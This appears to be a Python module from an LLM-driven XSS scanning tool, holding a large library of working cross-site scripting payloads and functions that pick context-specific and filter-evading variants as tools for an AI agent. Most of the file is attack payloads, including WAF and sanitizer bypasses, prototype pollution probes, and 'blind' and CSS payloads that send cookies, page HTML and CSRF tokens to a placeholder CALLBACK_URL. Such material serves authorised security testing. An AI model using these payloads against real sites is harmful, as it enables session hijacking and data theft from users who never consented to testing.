"""
xssentry/payloads.py

XSS payload library + context-aware generation.

Registered as tools 'get_payloads' and 'generate_adaptive_payload' in the LLM brain.

Payload categories:
  - reflected: Standard reflected XSS payloads
  - attribute: Attribute-breaking payloads (event handlers)
  - svg: SVG-based payloads
  - template: Template injection payloads
  - dom: DOM-based XSS payloads
  - polyglot: Multi-context payloads
  - encoding: Encoding bypass payloads
"""

import logging
from typing import Any, Dict, List

from xssentry.llm_brain import ToolSpec, register_tool

logger = logging.getLogger("xssentry.payloads")


# ═══════════════════════════════════════════════════════════════════
# PAYLOAD DATABASE
# ═══════════════════════════════════════════════════════════════════

PAYLOAD_DB: Dict[str, List[Dict[str, Any]]] = {
    "reflected": [
        {
            "payload": '<script>alert("XSS")</script>',
            "context": "html_body",
            "description": "Basic script tag injection",
            "bypass_target": "none",
            "severity": "high",
        },
        {
            "payload": "<img src=x onerror=alert('XSS')>",
            "context": "html_body",
            "description": "IMG tag with onerror event handler",
            "bypass_target": "script_tag_filter",
            "severity": "high",
        },
        {
            "payload": "<svg onload=alert('XSS')>",
            "context": "html_body",
            "description": "SVG onload event",
            "bypass_target": "script_tag_filter",
            "severity": "high",
        },
        {
            "payload": "<body onload=alert('XSS')>",
            "context": "html_body",
            "description": "Body onload event",
            "bypass_target": "script_tag_filter",
            "severity": "high",
        },
        {
            "payload": "javascript:alert('XSS')",
            "context": "href_attribute",
            "description": "JavaScript protocol in href",
            "bypass_target": "tag_filter",
            "severity": "high",
        },
    ],

    "attribute": [
        {
            "payload": '" autofocus onfocus="alert(1)" x="',
            "context": "attribute_value",
            "description": "Double-quote autofocus attribute breakout (fires automatically on page load)",
            "bypass_target": "tag_filter",
            "severity": "high",
        },
        {
            "payload": "' autofocus onfocus='alert(1)' x='",
            "context": "attribute_value",
            "description": "Single-quote autofocus attribute breakout (fires automatically on page load)",
            "bypass_target": "tag_filter",
            "severity": "high",
        },
        {
            "payload": '"><script>alert(1)</script>',
            "context": "attribute_value",
            "description": "Break out of attribute into script tag",
            "bypass_target": "attribute_encoding",
            "severity": "high",
        },
        {
            "payload": '"><svg onload=alert(1)>',
            "context": "attribute_value",
            "description": "Break out of attribute into SVG tag",
            "bypass_target": "attribute_encoding",
            "severity": "high",
        },
        {
            "payload": '" onmouseover="alert(\'XSS\')" x="',
            "context": "attribute_value",
            "description": "Double-quote attribute breakout with onmouseover (requires mouse hover over element)",
            "bypass_target": "tag_filter",
            "severity": "high",
        },
        {
            "payload": "' onmouseover='alert(1)' x='",
            "context": "attribute_value",
            "description": "Single-quote attribute breakout with onmouseover (requires mouse hover over element)",
            "bypass_target": "tag_filter",
            "severity": "high",
        },
        {
            "payload": "'><img src=x onerror=alert(1)>",
            "context": "attribute_value",
            "description": "Break out of single-quoted attribute into IMG",
            "bypass_target": "attribute_encoding",
            "severity": "high",
        },
    ],

    "svg": [
        {
            "payload": "<svg/onload=alert('XSS')>",
            "context": "html_body",
            "description": "SVG with no space before onload",
            "bypass_target": "space_filter",
            "severity": "high",
        },
        {
            "payload": "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
            "context": "html_body",
            "description": "SVG animate element with onbegin",
            "bypass_target": "onload_filter",
            "severity": "high",
        },
        {
            "payload": '<svg><a xlink:href="javascript:alert(1)"><text x="20" y="20">Click</text></a>',
            "context": "html_body",
            "description": "SVG anchor with javascript protocol via xlink",
            "bypass_target": "event_handler_filter",
            "severity": "medium",
        },
        {
            "payload": '<svg><set attributeName="onmouseover" to="alert(1)">',
            "context": "html_body",
            "description": "SVG set element to inject event handler",
            "bypass_target": "attribute_filter",
            "severity": "high",
        },
    ],

    "event_handler": [
        {
            "payload": '<details open ontoggle=alert(1)>',
            "context": "html_body",
            "description": "Details element with ontoggle",
            "bypass_target": "common_event_filter",
            "severity": "high",
        },
        {
            "payload": '<marquee onstart=alert(1)>',
            "context": "html_body",
            "description": "Marquee with onstart (legacy browser)",
            "bypass_target": "modern_tag_filter",
            "severity": "medium",
        },
        {
            "payload": '<input onfocus=alert(1) autofocus>',
            "context": "html_body",
            "description": "Input with autofocus triggering onfocus",
            "bypass_target": "tag_filter",
            "severity": "high",
        },
        {
            "payload": '<video><source onerror="alert(1)">',
            "context": "html_body",
            "description": "Video source onerror",
            "bypass_target": "img_filter",
            "severity": "high",
        },
        {
            "payload": '<audio src=x onerror=alert(1)>',
            "context": "html_body",
            "description": "Audio tag with onerror",
            "bypass_target": "img_filter",
            "severity": "high",
        },
    ],

    "template": [
        {
            "payload": "{{constructor.constructor('alert(1)')()}}",
            "context": "template_engine",
            "description": "Angular/template prototype chain to RCE",
            "bypass_target": "sandbox",
            "severity": "critical",
        },
        {
            "payload": "${alert(1)}",
            "context": "template_literal",
            "description": "ES6 template literal injection",
            "bypass_target": "quote_filter",
            "severity": "high",
        },
        {
            "payload": "{{7*7}}",
            "context": "template_engine",
            "description": "Template injection detection (expect 49)",
            "bypass_target": "none",
            "severity": "info",
        },
    ],

    "dom": [
        {
            "payload": "#<img src=x onerror=alert(1)>",
            "context": "url_fragment",
            "description": "Fragment-based DOM XSS via innerHTML",
            "bypass_target": "server_side_filter",
            "severity": "high",
        },
        {
            "payload": "javascript:alert(document.domain)",
            "context": "dom_sink",
            "description": "JavaScript protocol in DOM sink",
            "bypass_target": "server_side_filter",
            "severity": "high",
        },
    ],

    "polyglot": [
        {
            "payload": "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%%0telerik0telerik11telerik2telerik3telerik/telerik*telerik-+/~!|{}&lt;}/</stYle/</telerik</titLe/</telerikarea/</telerikxt/</telerikbr/</iframe/</noframes/</noscript/</noembed/</option/</select/</xmp&gt;\\u0022&gt;&lt;",
            "context": "multi_context",
            "description": "Multi-context polyglot (breaks out of many contexts)",
            "bypass_target": "mixed_filters",
            "severity": "high",
        },
        {
            "payload": '\'"--></style></script><svg onload=alert(1)//>',
            "context": "multi_context",
            "description": "Close style/script/attribute and inject SVG",
            "bypass_target": "context_confusion",
            "severity": "high",
        },
        {
            "payload": "'-alert(1)-'",
            "context": "javascript_string",
            "description": "Break out of JS string context",
            "bypass_target": "html_encoding",
            "severity": "high",
        },
    ],

    "javascript": [
        {
            "payload": r"\'-alert(1)//",
            "context": "javascript_string",
            "description": "Backslash escape bypass when single quotes are escaped with backslash (creates \\' where first backslash neutralizes the escaping backslash)",
            "bypass_target": "quote_escaping",
            "severity": "critical",
        },
        {
            "payload": r"\';alert(1)//",
            "context": "javascript_string",
            "description": "Backslash escape with statement termination",
            "bypass_target": "quote_escaping",
            "severity": "critical",
        },
        {
            "payload": r"\\'-alert(1)//",
            "context": "javascript_string",
            "description": "Double backslash escape breakout",
            "bypass_target": "quote_escaping",
            "severity": "critical",
        },
        {
            "payload": r"\\';alert(1)//",
            "context": "javascript_string",
            "description": "Double backslash with statement separator",
            "bypass_target": "quote_escaping",
            "severity": "critical",
        },
        {
            "payload": "'-alert(1)-'",
            "context": "javascript_string",
            "description": "Single-quote string breakout with arithmetic operator",
            "bypass_target": "none",
            "severity": "high",
        },
        {
            "payload": "';alert(1)//",
            "context": "javascript_string",
            "description": "Single-quote breakout with statement termination",
            "bypass_target": "none",
            "severity": "high",
        },
        {
            "payload": '"-alert(1)-"',
            "context": "javascript_string",
            "description": "Double-quote string breakout",
            "bypass_target": "none",
            "severity": "high",
        },
        {
            "payload": '";alert(1)//',
            "context": "javascript_string",
            "description": "Double-quote breakout with statement termination",
            "bypass_target": "none",
            "severity": "high",
        },
        {
            "payload": "</script><script>alert(1)</script>",
            "context": "javascript_string",
            "description": "Script tag closing breakout (bypasses string filters if angle brackets not encoded)",
            "bypass_target": "tag_closing",
            "severity": "high",
        },
        {
            "payload": "${alert(1)}",
            "context": "javascript_string",
            "description": "ES6 template literal expression breakout",
            "bypass_target": "template_literal",
            "severity": "high",
        },
    ],

    "encoding": [
        {
            "payload": "%3Cscript%3Ealert(1)%3C/script%3E",
            "context": "url_encoded",
            "description": "URL-encoded script tag (double encoding test)",
            "bypass_target": "single_decode",
            "severity": "high",
        },
        {
            "payload": "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",
            "context": "html_entity",
            "description": "HTML entity encoded script tag",
            "bypass_target": "keyword_filter",
            "severity": "high",
        },
        {
            "payload": "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",
            "context": "unicode_escape",
            "description": "Unicode escape encoded script tag",
            "bypass_target": "keyword_filter",
            "severity": "high",
        },
        {
            "payload": "<scr<script>ipt>alert(1)</scr</script>ipt>",
            "context": "html_body",
            "description": "Nested tag bypass (filter removes inner, outer remains)",
            "bypass_target": "recursive_strip",
            "severity": "high",
        },
        {
            "payload": "<SCRIPT>alert(1)</SCRIPT>",
            "context": "html_body",
            "description": "Case variation bypass",
            "bypass_target": "case_sensitive_filter",
            "severity": "high",
        },
        {
            "payload": "<img src=x onerror=alert(1)//",
            "context": "html_body",
            "description": "Unclosed tag with JS comment to break parsing",
            "bypass_target": "closing_tag_filter",
            "severity": "high",
        },
    ],

    # ═══════════════════════════════════════════════════════════
    # NEW CATEGORIES — from XSS Hunting Skill Knowledge Base
    # ═══════════════════════════════════════════════════════════

    "blind": [
        {
            "payload": '<img src=x onerror="fetch(\'https://CALLBACK_URL/xss-probe?t=img\')">',
            "context": "html_body",
            "description": "Blind XSS probe — IMG onerror callback (replace CALLBACK_URL with your listener)",
            "bypass_target": "none",
            "severity": "high",
        },
        {
            "payload": '<svg onload="fetch(\'https://CALLBACK_URL/xss-probe?t=svg\')">',
            "context": "html_body",
            "description": "Blind XSS probe — SVG onload callback",
            "bypass_target": "img_filter",
            "severity": "high",
        },
        {
            "payload": '<body onload="fetch(\'https://CALLBACK_URL/xss-probe?t=body\')">',
            "context": "html_body",
            "description": "Blind XSS probe — body onload callback",
            "bypass_target": "svg_filter",
            "severity": "high",
        },
        {
            "payload": '<details open ontoggle="fetch(\'https://CALLBACK_URL/xss-probe?t=details\')">',
            "context": "html_body",
            "description": "Blind XSS probe — details ontoggle callback",
            "bypass_target": "common_event_filter",
            "severity": "high",
        },
        {
            "payload": '<img src=x onerror="fetch(\'https://CALLBACK_URL/?k=\'+document.cookie)">',
            "context": "html_body",
            "description": "Blind XSS session theft — exfiltrates cookies via IMG onerror",
            "bypass_target": "none",
            "severity": "critical",
        },
        {
            "payload": '<svg onload="fetch(\'https://CALLBACK_URL/?k=\'+document.cookie)">',
            "context": "html_body",
            "description": "Blind XSS session theft — exfiltrates cookies via SVG onload",
            "bypass_target": "img_filter",
            "severity": "critical",
        },
        {
            "payload": '<img src=x onerror="fetch(\'https://CALLBACK_URL/dom\',{method:\'POST\',body:document.documentElement.outerHTML.substring(0,2000)})">',
            "context": "html_body",
            "description": "Blind XSS DOM snapshot — exfiltrates internal page structure for evidence",
            "bypass_target": "none",
            "severity": "critical",
        },
    ],

    "stored": [
        {
            "payload": '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"><circle cx="50" cy="50" r="40"/></svg>',
            "context": "svg_upload",
            "description": "SVG file upload with onload event (save as .svg and upload)",
            "bypass_target": "extension_only_check",
            "severity": "high",
        },
        {
            "payload": '<svg xmlns="http://www.w3.org/2000/svg"><script type="text/javascript">alert(document.domain)</script></svg>',
            "context": "svg_upload",
            "description": "SVG file upload with embedded script tag",
            "bypass_target": "extension_only_check",
            "severity": "high",
        },
        {
            "payload": '![x](javascript:alert(1))',
            "context": "markdown",
            "description": "Markdown image with javascript: protocol",
            "bypass_target": "markdown_renderer",
            "severity": "high",
        },
        {
            "payload": '[click](javascript:alert(document.domain))',
            "context": "markdown",
            "description": "Markdown link with javascript: protocol",
            "bypass_target": "markdown_renderer",
            "severity": "high",
        },
        {
            "payload": '![x](x" onerror="alert(1))',
            "context": "markdown",
            "description": "Markdown image with attribute breakout in rendered HTML",
            "bypass_target": "markdown_renderer",
            "severity": "high",
        },
        {
            "payload": '"><img src=x onerror=alert(1)>.jpg',
            "context": "filename",
            "description": "File upload filename XSS (use as uploaded filename)",
            "bypass_target": "filename_display",
            "severity": "high",
        },
    ],

    "csti": [
        {
            "payload": "{{7*7}}",
            "context": "template_engine",
            "description": "CSTI detection probe — if renders as 49, expressions are evaluated",
            "bypass_target": "none",
            "severity": "info",
        },
        {
            "payload": "{{constructor.constructor('alert(1)')()}}",
            "context": "template_engine",
            "description": "AngularJS sandbox escape — constructor chain to alert",
            "bypass_target": "html_escaping",
            "severity": "critical",
        },
        {
            "payload": "{{$on.constructor('alert(1)')()}}",
            "context": "template_engine",
            "description": "AngularJS alternative sandbox escape via $on",
            "bypass_target": "constructor_filter",
            "severity": "critical",
        },
        {
            "payload": "{{_c.constructor('alert(1)')()}}",
            "context": "template_engine",
            "description": "Vue.js template expression — constructor chain",
            "bypass_target": "html_escaping",
            "severity": "critical",
        },
        {
            "payload": "{{toString().constructor.constructor('alert(1)')()}}",
            "context": "template_engine",
            "description": "Generic template sandbox escape via toString",
            "bypass_target": "sandbox",
            "severity": "critical",
        },
        {
            "payload": "${7*7}",
            "context": "template_literal",
            "description": "ES6 template literal / EJS / Pug detection probe",
            "bypass_target": "none",
            "severity": "info",
        },
        {
            "payload": "<%= 7*7 %>",
            "context": "template_engine",
            "description": "ERB/EJS server-side template injection probe",
            "bypass_target": "none",
            "severity": "info",
        },
        {
            "payload": "#{7*7}",
            "context": "template_engine",
            "description": "Pug/Jade/Ruby template injection probe",
            "bypass_target": "none",
            "severity": "info",
        },
    ],

    "mutation": [
        {
            "payload": '<math><mtext><table><mglyph><svg><mtext><textarea><path d=""><img onerror=alert(1) src>',
            "context": "html_body",
            "description": "Parser confusion via nested math/svg/table — triggers sanitizer mXSS",
            "bypass_target": "sanitizer",
            "severity": "high",
        },
        {
            "payload": '<svg><style><img src="</style><img onerror=alert(1) src>">',
            "context": "html_body",
            "description": "Style-tag nesting confusion — sanitizer sees safe markup, browser re-parses",
            "bypass_target": "sanitizer",
            "severity": "high",
        },
        {
            "payload": '<form><math><mtext></form><form><mglyph><svg><mtext><textarea><path d=""><img onerror=alert(1) src>',
            "context": "html_body",
            "description": "Form nesting mXSS — exploits browser form adoption rules",
            "bypass_target": "sanitizer",
            "severity": "high",
        },
        {
            "payload": '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
            "context": "html_body",
            "description": "noscript breakout — sanitizer parses differently than browser",
            "bypass_target": "sanitizer",
            "severity": "high",
        },
        {
            "payload": '<svg></p><style><g title="</style><img src onerror=alert(1)>">',
            "context": "html_body",
            "description": "SVG-to-HTML namespace confusion — sanitizer vs browser parsing difference",
            "bypass_target": "sanitizer",
            "severity": "high",
        },
    ],

    "css_exfil": [
        {
            "payload": '<style>input[value^="a"]{background:url(https://CALLBACK_URL/?leak=a)}</style>',
            "context": "html_body",
            "description": "CSS attribute selector exfil — leaks character 'a' from input value (no JS needed)",
            "bypass_target": "csp_script_block",
            "severity": "medium",
        },
        {
            "payload": '<style>input[name="csrf"][value^="a"]{background:url(https://CALLBACK_URL/?csrf=a)}input[name="csrf"][value^="b"]{background:url(https://CALLBACK_URL/?csrf=b)}</style>',
            "context": "html_body",
            "description": "CSS CSRF token exfiltration — leaks token character-by-character",
            "bypass_target": "csp_script_block",
            "severity": "high",
        },
        {
            "payload": '<style>*{background:url(https://CALLBACK_URL/?page=loaded)}</style>',
            "context": "html_body",
            "description": "CSS injection confirmation probe — verifies CSS injection works",
            "bypass_target": "csp_script_block",
            "severity": "info",
        },
    ],

    "waf_bypass": [
        {
            "payload": '<img/src=x\tonerror=alert(1)>',
            "context": "html_body",
            "description": "Tab character between attribute and value bypasses space-based WAF rules",
            "bypass_target": "waf_space_pattern",
            "severity": "high",
        },
        {
            "payload": '<img src=x onerror=alert(1)\x00>',
            "context": "html_body",
            "description": "Null byte in tag — some WAFs truncate at null, browser ignores it",
            "bypass_target": "waf_null_byte",
            "severity": "high",
        },
        {
            "payload": '<svg\x0conload=alert(1)>',
            "context": "html_body",
            "description": "Form-feed character as attribute separator — bypasses space-matching WAFs",
            "bypass_target": "waf_whitespace",
            "severity": "high",
        },
        {
            "payload": '<img src=x onerror=\\u0061\\u006c\\u0065\\u0072\\u0074(1)>',
            "context": "html_body",
            "description": "Unicode escape sequences in event handler — bypasses keyword filters",
            "bypass_target": "waf_keyword_filter",
            "severity": "high",
        },
        {
            "payload": '<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">click</a>',
            "context": "html_body",
            "description": "HTML decimal entity encoded javascript: protocol in href",
            "bypass_target": "waf_protocol_filter",
            "severity": "high",
        },
        {
            "payload": '\\r\\nContent-Type: text/html\\r\\n\\r\\n<script>alert(1)</script>',
            "context": "http_header",
            "description": "CRLF injection — splits HTTP response to inject HTML body (test in header-reflecting endpoints)",
            "bypass_target": "header_injection",
            "severity": "critical",
        },
        {
            "payload": 'alert(document.cookie)//',
            "context": "jsonp_callback",
            "description": "JSONP callback XSS — supply as callback parameter on JSONP endpoints",
            "bypass_target": "jsonp_callback_filter",
            "severity": "high",
        },
        {
            "payload": '<iMg SrC=x oNeRrOr=alert(1)>',
            "context": "html_body",
            "description": "Mixed case tag + attribute — bypasses case-sensitive WAF patterns",
            "bypass_target": "waf_case_sensitive",
            "severity": "high",
        },
        {
            "payload": '<svg><script>al\u0065rt(1)</script>',
            "context": "html_body",
            "description": "SVG context with unicode escape in script — SVG allows HTML character references",
            "bypass_target": "waf_keyword_filter",
            "severity": "high",
        },
    ],

    "postmessage": [
        {
            "payload": '<script>window.postMessage("<img src=x onerror=alert(document.domain)>","*")</script>',
            "context": "dom_sink",
            "description": "postMessage injection — sends XSS payload via message event (test on pages with message listeners)",
            "bypass_target": "origin_check_bypass",
            "severity": "high",
        },
        {
            "payload": '<script>window.postMessage({"action":"render","html":"<img src=x onerror=alert(1)>"},"*")</script>',
            "context": "dom_sink",
            "description": "postMessage with JSON data — targets listeners expecting structured message objects",
            "bypass_target": "origin_check_bypass",
            "severity": "high",
        },
        {
            "payload": '<script>window.postMessage("javascript:alert(document.domain)","*")</script>',
            "context": "dom_sink",
            "description": "postMessage with javascript: URI — targets listeners that set location from message",
            "bypass_target": "origin_check_bypass",
            "severity": "high",
        },
    ],

    "prototype_pollution": [
        {
            "payload": '{"__proto__":{"testPollution":"yes"}}',
            "context": "json_api",
            "description": "Prototype pollution detection probe — check if Object.prototype.testPollution === 'yes'",
            "bypass_target": "none",
            "severity": "info",
        },
        {
            "payload": '{"__proto__":{"innerHTML":"<img src=x onerror=alert(1)>"}}',
            "context": "json_api",
            "description": "Prototype pollution → innerHTML injection via polluted default value",
            "bypass_target": "sanitizer_config",
            "severity": "critical",
        },
        {
            "payload": '{"constructor":{"prototype":{"escapeHtml":false}}}',
            "context": "json_api",
            "description": "Prototype pollution to disable sanitizer escaping via escapeHtml config",
            "bypass_target": "sanitizer_config",
            "severity": "critical",
        },
        {
            "payload": '{"__proto__":{"allowedTags":["script","img","svg"]}}',
            "context": "json_api",
            "description": "Prototype pollution to expand sanitizer allowedTags list",
            "bypass_target": "sanitizer_config",
            "severity": "critical",
        },
    ],
}


# ═══════════════════════════════════════════════════════════════════
# PAYLOAD SELECTION
# ═══════════════════════════════════════════════════════════════════

def get_payloads_for_context(
    context: str,
    categories: List[str] = None,
    max_payloads: int = 10,
) -> List[Dict[str, Any]]:
    """
    Select payloads appropriate for the given reflection context.

    Args:
        context: Where the input is reflected (html_body, attribute_value,
                 javascript_string, href_attribute, template_engine, etc.)
        categories: Specific payload categories to draw from
        max_payloads: Maximum payloads to return

    Returns:
        List of payload dicts with payload, description, bypass_target, severity
    """
    context_to_categories = {
        "html_body": ["reflected", "svg", "event_handler", "polyglot", "mutation"],
        "attribute_value": ["attribute", "svg", "polyglot"],
        "javascript_string": ["javascript", "polyglot", "template"],
        "href_attribute": ["reflected", "dom"],
        "template_engine": ["template", "csti"],
        "url_fragment": ["dom"],
        "url_encoded": ["encoding"],
        "svg_upload": ["stored"],
        "markdown": ["stored"],
        "filename": ["stored"],
        "json_api": ["prototype_pollution"],
        "jsonp_callback": ["waf_bypass"],
        "http_header": ["waf_bypass"],
        "dom_sink": ["dom", "postmessage"],
        "blind": ["blind"],
        "css_injection": ["css_exfil"],
        "unknown": ["reflected", "attribute", "javascript", "polyglot", "encoding"],
    }

    if categories:
        target_cats = categories
    else:
        target_cats = context_to_categories.get(context, context_to_categories["unknown"])

    selected = []
    for cat in target_cats:
        if cat in PAYLOAD_DB:
            for payload in PAYLOAD_DB[cat]:
                selected.append({**payload, "category": cat})

    # Sort by relevance: exact context match first, then severity
    severity_order = {"critical": 0, "high": 1, "medium": 2, "info": 3}
    selected.sort(key=lambda p: (
        0 if p.get("context") == context else 1,
        severity_order.get(p.get("severity", "info"), 4),
    ))

    return selected[:max_payloads]


# ═══════════════════════════════════════════════════════════════════
# TOOL EXECUTORS
# ═══════════════════════════════════════════════════════════════════

def execute_get_payloads(args: Dict[str, Any], context: Dict[str, Any]) -> Dict[str, Any]:
    """Tool executor: get context-appropriate payloads."""
    reflection_context = args.get("context", "unknown")
    categories = args.get("categories", None)
    max_payloads = args.get("max_payloads", 10)

    payloads = get_payloads_for_context(
        context=reflection_context,
        categories=categories,
        max_payloads=max_payloads,
    )

    return {
        "context": reflection_context,
        "payloads_returned": len(payloads),
        "payloads": payloads,
    }


def execute_generate_adaptive(args: Dict[str, Any], context: Dict[str, Any]) -> Dict[str, Any]:
    """
    Tool executor: generate adaptive payloads based on failure analysis.

    The LLM provides the failure context (what was filtered, how the response
    was encoded, what context the reflection appeared in) and this function
    returns specialized bypass payloads.
    """
    failure_reason = args.get("failure_reason", "")
    reflection_context = args.get("context", "unknown")
    filtered_chars = args.get("filtered_characters", [])
    encoding_observed = args.get("encoding_observed", "none")

    adaptive_payloads = []

    # Generate bypasses based on what was filtered
    if "<" in filtered_chars or ">" in filtered_chars:
        # Angle brackets filtered — use event handlers in existing tags
        adaptive_payloads.extend([
            {
                "payload": '" onmouseover="alert(1)" style="position:fixed;top:0;left:0;width:100%;height:100%" x="',
                "description": "Full-page invisible overlay with onmouseover (no angle brackets)",
                "bypass_target": "angle_bracket_filter",
                "category": "adaptive",
                "severity": "high",
            },
            {
                "payload": "' onfocus='alert(1)' autofocus='",
                "description": "Attribute injection without angle brackets",
                "bypass_target": "angle_bracket_filter",
                "category": "adaptive",
                "severity": "high",
            },
            {
                "payload": "javascript:alert(1)//",
                "description": "JavaScript protocol (no HTML tags needed)",
                "bypass_target": "angle_bracket_filter",
                "category": "adaptive",
                "severity": "high",
            },
        ])

    if "script" in filtered_chars or failure_reason.lower().count("script"):
        # script keyword filtered
        adaptive_payloads.extend([
            {
                "payload": "<img src=x onerror=alert(1)>",
                "description": "IMG onerror (avoids 'script' keyword)",
                "bypass_target": "script_keyword_filter",
                "category": "adaptive",
                "severity": "high",
            },
            {
                "payload": "<svg/onload=alert(1)>",
                "description": "SVG onload (avoids 'script' keyword)",
                "bypass_target": "script_keyword_filter",
                "category": "adaptive",
                "severity": "high",
            },
            {
                "payload": "<details open ontoggle=alert(1)>",
                "description": "Details ontoggle (avoids 'script' keyword)",
                "bypass_target": "script_keyword_filter",
                "category": "adaptive",
                "severity": "high",
            },
        ])

    if "alert" in filtered_chars:
        # alert() filtered — use alternatives
        adaptive_payloads.extend([
            {
                "payload": "<img src=x onerror=confirm(1)>",
                "description": "confirm() instead of alert()",
                "bypass_target": "alert_keyword_filter",
                "category": "adaptive",
                "severity": "high",
            },
            {
                "payload": "<img src=x onerror=prompt(1)>",
                "description": "prompt() instead of alert()",
                "bypass_target": "alert_keyword_filter",
                "category": "adaptive",
                "severity": "high",
            },
            {
                "payload": "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",
                "description": "Base64-encoded alert via eval+atob",
                "bypass_target": "alert_keyword_filter",
                "category": "adaptive",
                "severity": "high",
            },
        ])

    if "on" in filtered_chars:
        # Event handler prefix filtered
        adaptive_payloads.extend([
            {
                "payload": '<a href="javascript:alert(1)">click</a>',
                "description": "JavaScript protocol (no event handler needed)",
                "bypass_target": "event_handler_filter",
                "category": "adaptive",
                "severity": "medium",
            },
            {
                "payload": '<script>alert(1)</script>',
                "description": "Direct script tag (if only event handlers are filtered)",
                "bypass_target": "event_handler_filter",
                "category": "adaptive",
                "severity": "high",
            },
        ])

    if encoding_observed == "html_entity":
        # Server HTML-entity-encodes but may not handle double encoding
        adaptive_payloads.extend([
            {
                "payload": "%253Cscript%253Ealert(1)%253C/script%253E",
                "description": "Double URL-encoded to bypass single-pass decode + entity encode",
                "bypass_target": "html_entity_encoding",
                "category": "adaptive",
                "severity": "high",
            },
        ])

    if encoding_observed == "url_encode":
        adaptive_payloads.extend([
            {
                "payload": "<svg onload=alert(1)>",
                "description": "Raw payload (server may only URL-encode on storage, not display)",
                "bypass_target": "url_encoding",
                "category": "adaptive",
                "severity": "high",
            },
        ])

    if reflection_context in ("javascript_string", "script_block") or any(
        kw in failure_reason.lower() for kw in ("quote", "escape", "backslash", "string", "javascript")
    ) or "'" in filtered_chars or "\\" in filtered_chars:
        adaptive_payloads.extend([
            {
                "payload": r"\'-alert(1)//",
                "description": "Backslash escape bypass when single quotes are escaped with backslash",
                "bypass_target": "quote_escaping",
                "category": "adaptive",
                "severity": "critical",
            },
            {
                "payload": r"\';alert(1)//",
                "description": "Backslash escape with statement termination",
                "bypass_target": "quote_escaping",
                "severity": "critical",
            },
            {
                "payload": r"\\'-alert(1)//",
                "description": "Double backslash escape breakout",
                "bypass_target": "quote_escaping",
                "severity": "critical",
            },
            {
                "payload": "</script><script>alert(1)</script>",
                "description": "Script tag closing breakout",
                "bypass_target": "tag_closing",
                "category": "adaptive",
                "severity": "high",
            },
            {
                "payload": "${alert(1)}",
                "description": "ES6 template literal breakout",
                "bypass_target": "template_literal",
                "category": "adaptive",
                "severity": "high",
            },
        ])

    # Fallback: always include some creative payloads
    if not adaptive_payloads:
        adaptive_payloads.extend([
            {
                "payload": '<math><mtext><table><mglyph><svg><mtext><textarea><path d=""><img onerror=alert(1) src>',
                "description": "Parser confusion via nested math/svg/table",
                "bypass_target": "sanitizer",
                "category": "adaptive",
                "severity": "high",
            },
            {
                "payload": '<svg><use xlink:href="data:image/svg+xml,<svg id=x xmlns=http://www.w3.org/2000/svg xmlns:xlink=http://www.w3.org/1999/xlink><script>alert(1)</script></svg>#x">',
                "description": "SVG use element with data URI",
                "bypass_target": "csp_bypass",
                "category": "adaptive",
                "severity": "high",
            },
        ])

    return {
        "failure_context": {
            "reason": failure_reason,
            "reflection_context": reflection_context,
            "filtered_chars": filtered_chars,
            "encoding": encoding_observed,
        },
        "adaptive_payloads_generated": len(adaptive_payloads),
        "payloads": adaptive_payloads,
    }


# ═══════════════════════════════════════════════════════════════════
# TOOL REGISTRATION
# ═══════════════════════════════════════════════════════════════════

_GET_PAYLOADS_TOOL = ToolSpec(
    name="get_payloads",
    description=(
        "Get context-appropriate XSS payloads based on the reflection context. "
        "Pass the context where user input is reflected (html_body, attribute_value, "
        "javascript_string, href_attribute, template_engine, url_fragment, unknown) "
        "and receive a ranked list of payloads optimized for that context. "
        "You can also specify categories: reflected, attribute, svg, event_handler, "
        "template, dom, polyglot, encoding."
    ),
    parameters={
        "type": "object",
        "properties": {
            "context": {
                "type": "string",
                "description": "The reflection context: html_body, attribute_value, javascript_string, href_attribute, template_engine, url_fragment, or unknown.",
                "enum": ["html_body", "attribute_value", "javascript_string", "href_attribute", "template_engine", "url_fragment", "url_encoded", "unknown"],
            },
            "categories": {
                "type": "array",
                "items": {"type": "string"},
                "description": "Optional: specific payload categories to use (reflected, attribute, svg, event_handler, template, dom, polyglot, encoding).",
            },
            "max_payloads": {
                "type": "integer",
                "description": "Maximum number of payloads to return (default: 10).",
            },
        },
        "required": ["context"],
    },
    executor=execute_get_payloads,
)

_ADAPTIVE_TOOL = ToolSpec(
    name="generate_adaptive_payload",
    description=(
        "Generate new context-aware XSS payloads when standard payloads fail. "
        "Provide the failure reason (what was filtered/encoded), the reflection "
        "context, filtered characters, and encoding observed. Returns intelligent "
        "bypass payloads — NOT brute-force. Use this after test_payload returns "
        "failures to adapt your approach."
    ),
    parameters={
        "type": "object",
        "properties": {
            "failure_reason": {
                "type": "string",
                "description": "Why previous payloads failed (e.g., 'script keyword filtered', 'angle brackets encoded').",
            },
            "context": {
                "type": "string",
                "description": "The reflection context where the input appears.",
            },
            "filtered_characters": {
                "type": "array",
                "items": {"type": "string"},
                "description": "Characters or keywords that were observed to be filtered (e.g., ['<', '>', 'script', 'alert']).",
            },
            "encoding_observed": {
                "type": "string",
                "description": "Encoding applied to the input (none, html_entity, url_encode, unicode_escape, base64).",
            },
        },
        "required": ["failure_reason", "context"],
    },
    executor=execute_generate_adaptive,
)

register_tool(_GET_PAYLOADS_TOOL)
register_tool(_ADAPTIVE_TOOL)
